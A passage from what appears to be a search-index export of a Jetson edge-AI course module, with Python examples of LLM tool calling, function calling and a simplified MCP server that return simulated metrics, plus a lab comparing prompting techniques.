\"\"\"Create a prompt that enables tool calling\"\"\"\n        tools_description = json.dumps(self.available_tools, indent=2)\n\n        prompt = f\"\"\"\nYou are a Jetson AI assistant with access to specialized tools. Analyze the user's request and determine if you need to call any tools to provide a complete answer.\n\nAvailable Tools:\n{tools_description}\n\nUser Request: {user_request}\n\nIf you need to call tools, respond with a JSON object containing:\n{{\n    \"needs_tools\": true,\n    \"tool_calls\": [\n        {{\n            \"tool_name\": \"tool_name\",\n            \"parameters\": {{\"param1\": \"value1\"}},\n            \"reasoning\": \"Why this tool is needed\"\n        }}\n    ],\n    \"response_plan\": \"How you'll use the tool results to answer the user\"\n}}\n\nIf no tools are needed, respond with:\n{{\n    \"needs_tools\": false,\n    \"direct_response\": \"Your direct answer to the user\"\n}}\n\nAnalyze the request and respond:\n\"\"\"\n        return prompt\n\n    def execute_tool_call(self, tool_call: dict) -&gt; any:\n        \"\"\"Execute a tool call and return the result\"\"\"\n        tool_name = tool_call[\"tool_name\"]\n        parameters = tool_call[\"parameters\"]\n\n        if tool_name == \"get_system_info\":\n            return self.toolkit.get_system_info()\n        elif tool_name == \"benchmark_model\":\n            return self.toolkit.benchmark_model(**parameters)\n        elif tool_name == \"optimize_model\":\n            return self.toolkit.optimize_model(**parameters)\n        else:\n            return {\"error\": f\"Unknown tool: {tool_name}\"}\n\n    def process_request_with_tools(self, user_request: str) -&gt; str:\n        \"\"\"Process a user request, calling tools if needed\"\"\"\n        # Step 1: Determine if tools are needed\n        tool_prompt = self.create_tool_calling_prompt(user_request)\n        response = self.llm.invoke(tool_prompt)\n\n        try:\n            # Parse the response\n            response_data = json.loads(response)\n\n            if not response_data.get(\"needs_tools\", False):\n                return response_data.get(\"direct_response\", \"No response provided\")\n\n            # Step 2: Execute tool calls\n            tool_results = []\n            for tool_call in response_data.get(\"tool_calls\", []):\n                result = self.execute_tool_call(tool_call)\n                tool_results.append({\n                    \"tool_call\": tool_call,\n                    \"result\": result\n                })\n\n            # Step 3: Generate final response with tool results\n            final_prompt = f\"\"\"\nUser Request: {user_request}\n\nTool Results:\n{json.dumps(tool_results, indent=2, default=str)}\n\nBased on the tool results above, provide a comprehensive answer to the user's request. Include specific data from the tool results and practical recommendations.\n\nResponse:\n\"\"\"\n\n            final_response = self.llm.invoke(final_prompt)\n            return final_response\n\n        except json.JSONDecodeError:\n            return f\"Error parsing tool response: {response}\"\n        except Exception as e:\n            return f\"Error processing request: {e}\"\n\n# Example usage\ntool_prompter = ToolCallingPrompter(langchain_openai.llm)\n\n# Test tool calling\ntest_requests = [\n    \"What's the current system status of my Jetson?\",\n    \"I want to benchmark my YOLOv8 model at /models/yolov8n.onnx\",\n    \"How can I optimize my ResNet model for better performance?\",\n    \"Compare the performance of YOLOv8 vs MobileNet on Jetson\"\n]\n\nprint(\"\ud83d\udee0\ufe0f Tool Calling Examples:\")\nprint(\"=\" * 50)\n\nfor i, request in enumerate(test_requests[:2], 1):  # Test first 2 requests\n    print(f\"\\n{i}. Request: {request}\")\n    print(\"-\" * 40)\n    response = tool_prompter.process_request_with_tools(request)\n    print(f\"Response: {response[:300]}...\")\n</code></pre> <p>Note: This Tool Calling example is included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run it with: <pre><code>python jetson_prompt_toolkit.py --mode tools\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#function-calling-and-mcp-protocol","title":"\ud83d\udd27 Function Calling and MCP Protocol","text":""},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#function-calling-with-langchain","title":"\ud83c\udfaf Function Calling with LangChain","text":"<p>Function calling allows LLMs to execute specific functions based on natural language requests.</p> <pre><code>from typing import Dict, Any, Callable\nimport inspect\nfrom functools import wraps\n\nclass FunctionRegistry:\n    \"\"\"Registry for callable functions with automatic documentation\"\"\"\n\n    def __init__(self):\n        self.functions: Dict[str, Callable] = {}\n        self.function_docs: Dict[str, Dict] = {}\n\n    def register(self, name: str = None, description: str = None):\n        \"\"\"Decorator to register functions\"\"\"\n        def decorator(func: Callable):\n            func_name = name or func.__name__\n\n            # Extract function signature and docstring\n            sig = inspect.signature(func)\n            doc = description or func.__doc__ or \"No description available\"\n\n            # Build parameter documentation\n            params = {}\n            for param_name, param in sig.parameters.items():\n                params[param_name] = {\n                    \"type\": str(param.annotation) if param.annotation != inspect.Parameter.empty else \"Any\",\n                    \"default\": param.default if param.default != inspect.Parameter.empty else None,\n                    \"required\": param.default == inspect.Parameter.empty\n                }\n\n            self.functions[func_name] = func\n            self.function_docs[func_name] = {\n                \"description\": doc,\n                \"parameters\": params,\n                \"return_type\": str(sig.return_annotation) if sig.return_annotation != inspect.Parameter.empty else \"Any\"\n            }\n\n            return func\n        return decorator\n\n    def get_function_schema(self) -&gt; str:\n        \"\"\"Get JSON schema of all registered functions\"\"\"\n        return json.dumps(self.function_docs, indent=2)\n\n    def call_function(self, name: str, **kwargs) -&gt; Any:\n        \"\"\"Call a registered function with parameters\"\"\"\n        if name not in self.functions:\n            raise ValueError(f\"Function '{name}' not found\")\n\n        try:\n            return self.functions[name](**kwargs)\n        except Exception as e:\n            return {\"error\": f\"Function call failed: {str(e)}\"}\n\n# Create function registry\njetson_functions = FunctionRegistry()\n\n# Register Jetson-specific functions\n@jetson_functions.register(\n    description=\"Monitor Jetson system resources and performance metrics\"\n)\ndef monitor_jetson_resources(duration_seconds: int = 10) -&gt; Dict[str, Any]:\n    \"\"\"Monitor Jetson system resources for specified duration\"\"\"\n    import time\n    import random\n\n    # Simulate monitoring (would use actual system calls)\n    metrics = {\n        \"monitoring_duration\": duration_seconds,\n        \"average_cpu_usage\": round(random.uniform(20, 80), 2),\n        \"peak_gpu_memory_mb\": round(random.uniform(1000, 3000), 2),\n        \"average_temperature_c\": round(random.uniform(35, 65), 2),\n        \"power_consumption_w\": round(random.uniform(8, 25), 2),\n        \"thermal_throttling_events\": random.randint(0, 3)\n    }\n\n    return metrics\n\n@jetson_functions.register(\n    description=\"Deploy and test an AI model on Jetson with performance analysis\"\n)\ndef deploy_model(model_path: str, test_images: int = 100, precision: str = \"fp16\") -&gt; Dict[str, Any]:\n    \"\"\"Deploy model and run performance tests\"\"\"\n    import time\n    import random\n\n    # Simulate deployment process\n    time.sleep(1)  # Simulate deployment time\n\n    results = {\n        \"model_path\": model_path,\n        \"deployment_status\": \"success\",\n        \"precision\": precision,\n        \"test_images_processed\": test_images,\n        \"average_fps\": round(random.uniform(15, 60), 2),\n        \"average_latency_ms\": round(random.uniform(10, 100), 2),\n        \"memory_usage_mb\": round(random.uniform(500, 2000), 2),\n        \"accuracy_score\": round(random.uniform(0.8, 0.95), 3),\n        \"deployment_time_seconds\": round(random.uniform(30, 120), 2)\n    }\n\n    return results\n\n@jetson_functions.register(\n    description=\"Compare multiple AI models on Jetson platform\"\n)\ndef compare_models(model_paths: list, test_dataset: str = \"coco_val\") -&gt; Dict[str, Any]:\n    \"\"\"Compare performance of multiple models\"\"\"\n    import random\n\n    comparisons = []\n    for model_path in model_paths:\n        model_name = model_path.split('/')[-1]\n        comparison = {\n            \"model_name\": model_name,\n            \"fps\": round(random.uniform(10, 50), 2),\n            \"latency_ms\": round(random.uniform(20, 100), 2),\n            \"memory_mb\": round(random.uniform(400, 1500), 2),\n            \"accuracy\": round(random.uniform(0.75, 0.92), 3),\n            \"power_efficiency\": round(random.uniform(1.5, 4.0), 2)  # FPS per Watt\n        }\n        comparisons.append(comparison)\n\n    # Find best model for each metric\n    best_fps = max(comparisons, key=lambda x: x['fps'])\n    best_accuracy = max(comparisons, key=lambda x: x['accuracy'])\n    best_efficiency = max(comparisons, key=lambda x: x['power_efficiency'])\n\n    return {\n        \"test_dataset\": test_dataset,\n        \"models_compared\": len(model_paths),\n        \"detailed_results\": comparisons,\n        \"recommendations\": {\n            \"best_for_speed\": best_fps['model_name'],\n            \"best_for_accuracy\": best_accuracy['model_name'],\n            \"best_for_efficiency\": best_efficiency['model_name']\n        }\n    }\n\nclass FunctionCallingPrompter:\n    \"\"\"LLM prompter with function calling capabilities\"\"\"\n\n    def __init__(self, llm, function_registry: FunctionRegistry):\n        self.llm = llm\n        self.registry = function_registry\n\n    def create_function_calling_prompt(self, user_request: str) -&gt; str:\n        \"\"\"Create prompt for function calling\"\"\"\n        function_schema = self.registry.get_function_schema()\n\n        prompt = f\"\"\"\nYou are a Jetson AI assistant with access to specialized functions. Analyze the user's request and determine which functions to call.\n\nAvailable Functions:\n{function_schema}\n\nUser Request: {user_request}\n\nIf you need to call functions, respond with a JSON object:\n{{\n    \"needs_functions\": true,\n    \"function_calls\": [\n        {{\n            \"function_name\": \"function_name\",\n            \"parameters\": {{\"param1\": \"value1\"}},\n            \"reasoning\": \"Why this function is needed\"\n        }}\n    ],\n    \"execution_plan\": \"How you'll use the function results\"\n}}\n\nIf no functions are needed, respond with:\n{{\n    \"needs_functions\": false,\n    \"direct_response\": \"Your direct answer\"\n}}\n\nAnalyze and respond:\n\"\"\"\n        return prompt\n\n    def execute_function_calls(self, function_calls: list) -&gt; list:\n        \"\"\"Execute multiple function calls\"\"\"\n        results = []\n        for call in function_calls:\n            func_name = call[\"function_name\"]\n            parameters = call[\"parameters\"]\n\n            try:\n                result = self.registry.call_function(func_name, **parameters)\n                results.append({\n                    \"function_call\": call,\n                    \"result\": result,\n                    \"status\": \"success\"\n                })\n            except Exception as e:\n                results.append({\n                    \"function_call\": call,\n                    \"error\": str(e),\n                    \"status\": \"error\"\n                })\n\n        return results\n\n    def process_with_functions(self, user_request: str) -&gt; str:\n        \"\"\"Process request with function calling\"\"\"\n        # Step 1: Determine function calls\n        function_prompt = self.create_function_calling_prompt(user_request)\n        response = self.llm.invoke(function_prompt)\n\n        try:\n            response_data = json.loads(response)\n\n            if not response_data.get(\"needs_functions\", False):\n                return response_data.get(\"direct_response\", \"No response provided\")\n\n            # Step 2: Execute functions\n            function_results = self.execute_function_calls(\n                response_data.get(\"function_calls\", [])\n            )\n\n            # Step 3: Generate final response\n            final_prompt = f\"\"\"\nUser Request: {user_request}\n\nFunction Execution Results:\n{json.dumps(function_results, indent=2, default=str)}\n\nBased on the function results, provide a comprehensive answer to the user's request. Include specific data, insights, and actionable recommendations.\n\nResponse:\n\"\"\"\n\n            return self.llm.invoke(final_prompt)\n\n        except json.JSONDecodeError:\n            return f\"Error parsing function response: {response}\"\n        except Exception as e:\n            return f\"Error processing request: {e}\"\n\n# Example usage\nfunction_prompter = FunctionCallingPrompter(langchain_openai.llm, jetson_functions)\n\n# Test function calling\nfunction_test_requests = [\n    \"Monitor my Jetson system for 30 seconds and tell me about performance\",\n    \"Deploy my YOLOv8 model at /models/yolov8s.onnx and test it with 50 images\",\n    \"Compare these models: ['/models/yolo.onnx', '/models/resnet.trt', '/models/mobilenet.engine']\"\n]\n\nprint(\"\\n\ud83d\udd27 Function Calling Examples:\")\nprint(\"=\" * 50)\n\nfor i, request in enumerate(function_test_requests[:2], 1):\n    print(f\"\\n{i}. Request: {request}\")\n    print(\"-\" * 40)\n    response = function_prompter.process_with_functions(request)\n    print(f\"Response: {response[:300]}...\")\n</code></pre> <p>Note: This Function Calling example is included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run it with: <pre><code>python jetson_prompt_toolkit.py --mode functions\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#model-context-protocol-mcp","title":"\ud83c\udf10 Model Context Protocol (MCP)","text":"<p>MCP is a new standard for connecting LLMs to external tools and data sources. Here's how it works from a prompt engineering perspective:</p> <pre><code>class MCPServer:\n    \"\"\"Simplified MCP server implementation for Jetson tools\"\"\"\n\n    def __init__(self):\n        self.tools = {}\n        self.resources = {}\n        self.prompts = {}\n\n    def register_tool(self, name: str, description: str, handler: Callable):\n        \"\"\"Register a tool with MCP server\"\"\"\n        self.tools[name] = {\n            \"name\": name,\n            \"description\": description,\n            \"handler\": handler,\n            \"inputSchema\": self._extract_schema(handler)\n        }\n\n    def register_resource(self, uri: str, name: str, description: str, content_provider: Callable):\n        \"\"\"Register a resource (data source)\"\"\"\n        self.resources[uri] = {\n            \"uri\": uri,\n            \"name\": name,\n            \"description\": description,\n            \"provider\": content_provider\n        }\n\n    def register_prompt(self, name: str, description: str, template: str):\n        \"\"\"Register a prompt template\"\"\"\n        self.prompts[name] = {\n            \"name\": name,\n            \"description\": description,\n            \"template\": template\n        }\n\n    def _extract_schema(self, handler: Callable) -&gt; dict:\n        \"\"\"Extract JSON schema from function signature\"\"\"\n        sig = inspect.signature(handler)\n        properties = {}\n        required = []\n\n        for param_name, param in sig.parameters.items():\n            if param.annotation != inspect.Parameter.empty:\n                param_type = str(param.annotation).replace(\"&lt;class '\", \"\").replace(\"'&gt;\", \"\")\n                properties[param_name] = {\"type\": param_type}\n\n                if param.default == inspect.Parameter.empty:\n                    required.append(param_name)\n\n        return {\n            \"type\": \"object\",\n            \"properties\": properties,\n            \"required\": required\n        }\n\n    def list_tools(self) -&gt; dict:\n        \"\"\"List available tools\"\"\"\n        return {\"tools\": list(self.tools.values())}\n\n    def call_tool(self, name: str, arguments: dict) -&gt; dict:\n        \"\"\"Call a tool with arguments\"\"\"\n        if name not in self.tools:\n            return {\"error\": f\"Tool '{name}' not found\"}\n\n        try:\n            result = self.tools[name][\"handler\"](**arguments)\n            return {\"content\": [{\"type\": \"text\", \"text\": str(result)}]}\n        except Exception as e:\n            return {\"error\": str(e)}\n\n    def get_prompt(self, name: str, arguments: dict = None) -&gt; dict:\n        \"\"\"Get a prompt template with arguments\"\"\"\n        if name not in self.prompts:\n            return {\"error\": f\"Prompt '{name}' not found\"}\n\n        template = self.prompts[name][\"template\"]\n        if arguments:\n            try:\n                formatted = template.format(**arguments)\n                return {\"messages\": [{\"role\": \"user\", \"content\": {\"type\": \"text\", \"text\": formatted}}]}\n            except KeyError as e:\n                return {\"error\": f\"Missing argument: {e}\"}\n\n        return {\"messages\": [{\"role\": \"user\", \"content\": {\"type\": \"text\", \"text\": template}}]}\n\n# Create MCP server for Jetson\njetson_mcp = MCPServer()\n\n# Register tools\ndef jetson_system_status() -&gt; dict:\n    \"\"\"Get comprehensive Jetson system status\"\"\"\n    return {\n        \"gpu_utilization\": 75.2,\n        \"memory_usage_gb\": 6.4,\n        \"temperature_c\": 52.1,\n        \"power_draw_w\": 18.5,\n        \"cpu_frequency_mhz\": 1900,\n        \"gpu_frequency_mhz\": 1300\n    }\n\ndef optimize_inference_pipeline(model_type: str, target_fps: int) -&gt; dict:\n    \"\"\"Optimize inference pipeline for target performance\"\"\"\n    optimizations = {\n        \"yolo\": [\"TensorRT FP16\", \"Dynamic batching\", \"CUDA streams\"],\n        \"resnet\": [\"TensorRT INT8\", \"Layer fusion\", \"Memory pooling\"],\n        \"transformer\": [\"Flash attention\", \"KV cache optimization\", \"Quantization\"]\n    }\n\n    return {\n        \"model_type\": model_type,\n        \"target_fps\": target_fps,\n        \"recommended_optimizations\": optimizations.get(model_type, [\"General TensorRT optimization\"]),\n        \"estimated_speedup\": \"2.5x\",\n        \"implementation_complexity\": \"Medium\"\n    }\n\njetson_mcp.register_tool(\"jetson_status\", \"Get current Jetson system status\", jetson_system_status)\njetson_mcp.register_tool(\"optimize_pipeline\", \"Optimize inference pipeline\", optimize_inference_pipeline)\n\n# Register prompt templates\njetson_mcp.register_prompt(\n    \"model_optimization\",\n    \"Generate optimization plan for AI model\",\n    \"\"\"\nYou are a Jetson optimization expert. Create a detailed optimization plan for:\n\nModel: {model_name}\nCurrent Performance: {current_fps} FPS\nTarget Performance: {target_fps} FPS\nPlatform: {jetson_model}\n\nProvide:\n1. Specific optimization techniques\n2. Expected performance gains\n3. Implementation steps\n4. Potential trade-offs\n\nOptimization Plan:\n\"\"\"\n)\n\njetson_mcp.register_prompt(\n    \"deployment_checklist\",\n    \"Generate deployment checklist for Jetson AI application\",\n    \"\"\"\nCreate a comprehensive deployment checklist for:\n\nApplication: {app_name}\nModel: {model_type}\nTarget Device: {device_type}\nPerformance Requirements: {requirements}\n\nInclude:\n- Pre-deployment testing\n- Performance validation\n- Monitoring setup\n- Troubleshooting steps\n\nDeployment Checklist:\n\"\"\"\n)\n\nclass MCPPrompter:\n    \"\"\"LLM prompter with MCP integration\"\"\"\n\n    def __init__(self, llm, mcp_server: MCPServer):\n        self.llm = llm\n        self.mcp = mcp_server\n\n    def process_with_mcp(self, user_request: str) -&gt; str:\n        \"\"\"Process request using MCP tools and prompts\"\"\"\n        # Get available tools\n        tools = self.mcp.list_tools()\n\n        # Create MCP-aware prompt\n        mcp_prompt = f\"\"\"\nYou have access to MCP tools and prompts. Analyze the user request and determine the best approach.\n\nAvailable Tools:\n{json.dumps(tools, indent=2)}\n\nUser Request: {user_request}\n\nIf you need to use MCP tools, respond with:\n{{\n    \"action\": \"use_tools\",\n    \"tools_needed\": [\n        {{\"tool_name\": \"tool_name\", \"arguments\": {{\"arg1\": \"value1\"}}}}\n    ]\n}}\n\nIf you need a specific prompt template, respond with:\n{{\n    \"action\": \"use_prompt\",\n    \"prompt_name\": \"prompt_name\",\n    \"arguments\": {{\"arg1\": \"value1\"}}\n}}\n\nIf you can answer directly, respond with:\n{{\n    \"action\": \"direct_response\",\n    \"response\": \"Your answer\"\n}}\n\nAnalyze and respond:\n\"\"\"\n\n        response = self.llm.invoke(mcp_prompt)\n\n        try:\n            action_data = json.loads(response)\n            action = action_data.get(\"action\")\n\n            if action == \"use_tools\":\n                # Execute MCP tools\n                tool_results = []\n                for tool_call in action_data.get(\"tools_needed\", []):\n                    result = self.mcp.call_tool(\n                        tool_call[\"tool_name\"],\n                        tool_call[\"arguments\"]\n                    )\n                    tool_results.append(result)\n\n                # Generate response with tool results\n                final_prompt = f\"\"\"\nUser Request: {user_request}\n\nMCP Tool Results:\n{json.dumps(tool_results, indent=2)}\n\nProvide a comprehensive response based on the tool results:\n\"\"\"\n                return self.llm.invoke(final_prompt)\n\n            elif action == \"use_prompt\":\n                # Use MCP prompt template\n                prompt_result = self.mcp.get_prompt(\n                    action_data[\"prompt_name\"],\n                    action_data.get(\"arguments\", {})\n                )\n\n                if \"error\" in prompt_result:\n                    return f\"Error using prompt: {prompt_result['error']}\"\n\n                # Execute the prompt\n                prompt_text = prompt_result[\"messages\"][0][\"content\"][\"text\"]\n                return self.llm.invoke(prompt_text)\n\n            elif action == \"direct_response\":\n                return action_data.get(\"response\", \"No response provided\")\n\n        except json.JSONDecodeError:\n            return f\"Error parsing MCP response: {response}\"\n        except Exception as e:\n            return f\"Error processing MCP request: {e}\"\n\n# Example usage\nmcp_prompter = MCPPrompter(langchain_openai.llm, jetson_mcp)\n\n# Test MCP integration\nmcp_test_requests = [\n    \"What's my current Jetson system status?\",\n    \"Create an optimization plan for my YOLOv8 model running at 15 FPS, targeting 30 FPS on Jetson Orin Nano\",\n    \"Generate a deployment checklist for my object detection application\"\n]\n\nprint(\"\\n\ud83c\udf10 MCP Integration Examples:\")\nprint(\"=\" * 50)\n\nfor i, request in enumerate(mcp_test_requests[:2], 1):\n    print(f\"\\n{i}. Request: {request}\")\n    print(\"-\" * 40)\n    response = mcp_prompter.process_with_mcp(request)\n    print(f\"Response: {response[:300]}...\")\n</code></pre> <p>Note: This MCP integration example is included in the unified <code>jetson_prompt_toolkit.py</code> script. You can run it with: <pre><code>python jetson_prompt_toolkit.py --mode mcp\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#lab-advanced-prompt-engineering-on-jetson-with-langchain","title":"\ud83e\uddea Lab: Advanced Prompt Engineering on Jetson with LangChain","text":""},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#lab-objectives","title":"\ud83c\udfaf Lab Objectives","text":"<ol> <li>Master Core Techniques: Implement and compare different prompt engineering approaches</li> <li>Build Tool Integration: Create LLM systems that can call external tools and functions</li> <li>Develop MCP Applications: Build applications using the Model Context Protocol</li> <li>Optimize for Jetson: Apply prompt engineering specifically for edge AI scenarios</li> </ol>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#lab-setup","title":"\ud83d\udee0\ufe0f Lab Setup","text":"<pre><code># Install required packages\npip install langchain langchain-openai langchain-community\npip install ollama llama-cpp-python\npip install pydantic psutil\n\n# Start Ollama (if using local models)\nollama serve\nollama pull llama3.2:3b\n</code></pre>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#exercise-1-prompt-engineering-comparison","title":"\ud83d\udccb Exercise 1: Prompt Engineering Comparison","text":"<p>Create a comprehensive comparison system for different prompting techniques:</p> <p><pre><code>import time\nimport json\nfrom typing import Dict, List, Any\nfrom dataclasses import dataclass\nfrom enum import Enum\n\nclass PromptType(Enum):\n    BASIC = \"basic\"\n    CHAIN_OF_THOUGHT = \"chain_of_thought\"\n    FEW_SHOT = \"few_shot\"\n    ROLE_BASED = \"role_based\"\n    IN_CONTEXT_LEARNING = \"in_context_learning\"\n\n@dataclass\nclass PromptResult:\n    prompt_type: PromptType\n    response: str\n    response_time: float\n    token_count: int\n    quality_score: float\n\nclass PromptEngineeringLab:\n    \"\"\"Comprehensive lab for testing prompt engineering techniques\"\"\"\n\n    def __init__(self, llm_clients: Dict[str, Any]):\n        self.llm_clients = llm_clients\n        self.results = []\n\n    def create_prompts(self, task: str, context: str = \"\") -&gt; Dict[PromptType, str]:\n        \"\"\"Create different prompt variations for the same task\"\"\"\n\n        prompts = {\n            PromptType.BASIC: f\"{task}\",\n\n            PromptType.CHAIN_OF_THOUGHT: f\"\"\"\n{task}\n\nLet's think step by step:\n1. First, I need to understand the problem\n2. Then, I'll analyze the requirements\n3. Next, I'll consider the constraints\n4. Finally, I'll provide a comprehensive solution\n\nStep-by-step analysis:\n\"\"\",\n\n            PromptType.FEW_SHOT: f\"\"\"\nHere are some examples of similar tasks:\n\nExample 1:\nTask: Optimize a CNN model for mobile deployment\nSolution: Use quantization, pruning, and knowledge distillation\n\nExample 2:\nTask: Reduce inference latency for object detection\nSolution: Use TensorRT, optimize batch size, and implement async processing\n\nNow solve this task:\n{task}\n\nSolution:\n\"\"\",\n\n            PromptType.ROLE_BASED: f\"\"\"\nYou are a senior NVIDIA Jetson optimization engineer with 10+ years of experience in edge AI deployment. You specialize in maximizing performance while minimizing power consumption.\n\nTask: {task}\n\nAs an expert, provide your professional recommendation:\n\"\"\",\n\n            PromptType.IN_CONTEXT_LEARNING: f\"\"\"\nI'll teach you a new format for Jetson optimization reports:\n\nFormat:\n</code></pre> OPTIMIZATION REPORT ================== Model: [model_name] Current Performance: [fps] FPS, [latency]ms latency Target Performance: [target_fps] FPS</p> <p>Optimization Strategy: - Technique 1: [description] -&gt; Expected gain: [X]% - Technique 2: [description] -&gt; Expected gain: [Y]%</p> <p>Implementation Priority: 1. [High priority item] 2. [Medium priority item] 3. [Low priority item]</p> <p>Risk Assessment: [Low/Medium/High] Estimated Timeline: [X] days <pre><code>Now use this format to solve:\n{task}\n\"\"\"\n        }\n\n        return prompts\n\n    def evaluate_response(self, response: str, expected_keywords: List[str]) -&gt; float:\n        \"\"\"Simple quality evaluation based on keyword presence\"\"\"\n        score = 0.0\n        response_lower = response.lower()\n\n        for keyword in expected_keywords:\n            if keyword.lower() in response_lower:\n                score += 1.0\n\n        return min(score / len(expected_keywords), 1.0) if expected_keywords else 0.5\n\n    def run_prompt_comparison(self, task: str, expected_keywords: List[str]) -&gt; List[PromptResult]:\n        \"\"\"Run the same task with different prompting techniques\"\"\"\n        prompts = self.create_prompts(task)\n        results = []\n\n        for prompt_type, prompt_text in prompts.items():\n            print(f\"\\nTesting {prompt_type.value} prompting...\")\n\n            for llm_name, llm in self.llm_clients.items():\n                start_time = time.time()\n\n                try:\n                    response = llm.invoke(prompt_text)\n                    response_time = time.time() - start_time\n\n                    # Estimate token count (rough approximation)\n                    token_count = len(response.split()) * 1.3\n\n                    # Evaluate quality\n                    quality_score = self.evaluate_response(response, expected_keywords)\n\n                    result = PromptResult(\n                        prompt_type=prompt_type,\n                        response=response,\n                        response_time=response_time,\n                        token_count=int(token_count),\n                        quality_score=quality_score\n                    )\n\n                    results.append(result)\n                    print(f\"  {llm_name}: {quality_score:.2f} quality, {response_time:.2f}s\")\n\n                except Exception as e:\n                    print(f\"  {llm_name}: Error - {e}\")\n\n        return results\n\n    def generate_comparison_report(self, results: List[PromptResult]) -&gt; str:\n        \"\"\"Generate a comprehensive comparison report\"\"\"\n        report = \"\\n\" + \"=\" * 60\n        report += \"\\nPROMPT ENGINEERING COMPARISON REPORT\\n\"\n        report += \"=\" * 60 + \"\\n\"\n\n        # Group by prompt type\n        by_type = {}\n        for result in results:\n            if result.prompt_type not in by_type:\n                by_type[result.prompt_type] = []\n            by_type[result.prompt_type].append(result)\n\n        # Calculate averages\n        for prompt_type, type_results in by_type.items():\n            avg_quality = sum(r.quality_score for r in type_results) / len(type_results)\n            avg_time = sum(r.response_time for r in type_results) / len(type_results)\n            avg_tokens = sum(r.token_count for r in type_results) / len(type_results)\n\n            report += f\"\\n{prompt_type.value.upper()}:\\n\"\n            report += f\"  Average Quality: {avg_quality:.3f}\\n\"\n            report += f\"  Average Time: {avg_time:.2f}s\\n\"\n            report += f\"  Average Tokens: {avg_tokens:.0f}\\n\"\n\n        # Find best performing technique\n        best_quality = max(results, key=lambda r: r.quality_score)\n        fastest = min(results, key=lambda r: r.response_time)\n\n        report += f\"\\nBEST PERFORMERS:\\n\"\n        report += f\"  Highest Quality: {best_quality.prompt_type.value} ({best_quality.quality_score:.3f})\\n\"\n        report += f\"  Fastest Response: {fastest.prompt_type.value} ({fastest.response_time:.2f}s)\\n\"\n\n        return report\n\n# Initialize lab\nlab = PromptEngineeringLab({\n    \"openai\": langchain_openai.llm,\n    \"ollama\": langchain_ollama.llm,\n    \"llamacpp\": langchain_llamacpp.llm\n})\n\n# Test scenarios\ntest_scenarios = [\n    {\n        \"task\": \"How can I optimize a YOLOv8 model running at 15 FPS to achieve 30 FPS on Jetson Orin Nano?\",\n        \"keywords\": [\"tensorrt\", \"quantization\", \"batch\", \"optimization\", \"fp16\", \"int8\", \"engine\"]\n    },\n    {\n        \"task\": \"What's the best approach to deploy multiple AI models simultaneously on Jetson while maintaining real-time performance?\",\n        \"keywords\": [\"pipeline\", \"scheduling\", \"memory\", \"concurrent\", \"optimization\", \"resource\"]\n    }\n]\n\nprint(\"\ud83e\uddea Starting Prompt Engineering Lab...\")\nprint(\"=\" * 50)\n\nfor i, scenario in enumerate(test_scenarios, 1):\n    print(f\"\\n\ud83d\udccb Scenario {i}: {scenario['task'][:50]}...\")\n    results = lab.run_prompt_comparison(scenario[\"task\"], scenario[\"keywords\"])\n    report = lab.generate_comparison_report(results)\n    print(report)\n</code></pre></p>"},{"location":"curriculum/08_prompt_engineering_langchain_jetson/#exercise-2-advanced-tool-integration","title":"\ud83d\udccb Exercise 2: Advanced Tool Integration","text":"<p>Build a comprehensive Jetson AI assistant with multiple tool capabilities:</p> <pre><code>class JetsonAIAssistant:\n    \"\"\"Advanced AI assistant for Jetson development\"\"\"\n\n    def __init__(self, llm):\n        self.llm = llm\n        self.conversation_history = []\n        self.tool_registry = self._setup_tools()\n        self.mcp_server = self._setup_mcp()\n\n    def _setup_tools(self) -&gt; Dict[str, Callable]:\n        \"\"\"Setup comprehensive tool registry\"\"\"\n        tools = {\n            \"system_monitor\": self._monitor_system,\n            \"model_benchmark\": self._benchmark_model,\n            \"optimization_advisor\": self._get_optimization_advice,\n            \"deployment_validator\": self._validate_deployment,\n            \"performance_predictor\": self._predict_performance,\n            \"resource_planner\": self._plan_resources\n        }\n        return tools\n\n    def _setup_mcp(self) -&gt; MCPServer:\n        \"\"\"Setup MCP server with Jetson-specific capabilities\"\"\"\n        mcp = MCPServer()\n\n        # Register advanced prompt templates\n        mcp.register_prompt(\n            \"performance_analysis\",\n            \"Analyze model performance and suggest improvements\",\n            \"\"\"\nPerform a comprehensive performance analysis for:\n\nModel: {model_name}\nCurrent Metrics:\n- FPS: {current_fps}\n- Latency: {current_latency}ms\n- Memory Usage: {memory_usage}MB\n- Power Draw: {power_draw}W\n\nTarget Requirements:\n- Minimum FPS: {target_fps}\n- Maximum Latency: {max_latency}ms\n- Memory Budget: {memory_budget}MB\n- Power Budget: {power_budget}W\n\nPlatform: {platform}\nUse Case: {use_case}\n\nProvide:\n1. Performance gap analysis\n2. Bottleneck identification\n3. Optimization roadmap with priorities\n4. Risk assessment for each optimization\n5. Expected timeline and resource requirements\n\nAnalysis:\n\"\"\"\n        )\n\n        mcp.register_prompt(\n            \"deployment_strategy\",\n            \"Create deployment strategy for production\",\n            \"\"\"\nCreate a production deployment strategy for:\n\nApplication: {app_name}\nModels: {models}\nTarget Devices: {devices}\nScale: {scale}\nSLA Requirements: {sla}\n\nConsider:\n- Model versioning and updates\n- A/B testing capabilities\n- Monitoring and alerting\n- Rollback procedures\n- Performance optimization\n- Security considerations\n\nDeployment Strategy:\n\"\"\"\n        )\n\n        return mcp\n\n    def _monitor_system(self, duration: int = 60) -&gt; Dict[str, Any]:\n        \"\"\"Advanced system monitoring\"\"\"\n        import random\n        import time\n\n        # Simulate comprehensive monitoring\n        metrics = {\n            \"monitoring_duration\": duration,\n            \"system_health\": {\n                \"cpu_usage_avg\": round(random.uniform(20, 80), 2),\n                \"cpu_usage_peak\": round(random.uniform(80, 95), 2),\n                \"gpu_utilization_avg\": round(random.uniform(30, 90), 2),\n                \"memory_usage_gb\": round(random.uniform(4, 14), 2),\n                \"temperature_avg\": round(random.uniform(40, 70), 2),\n                \"temperature_peak\": round(random.uniform(70, 85), 2),\n                \"power_consumption_avg\": round(random.uniform(10, 25), 2),\n                \"thermal_throttling_events\": random.randint(0, 5)\n            },\n            \"performance_metrics\": {\n                \"inference_fps\": round(random.uniform(15, 60), 2),\n                \"latency_p50\": 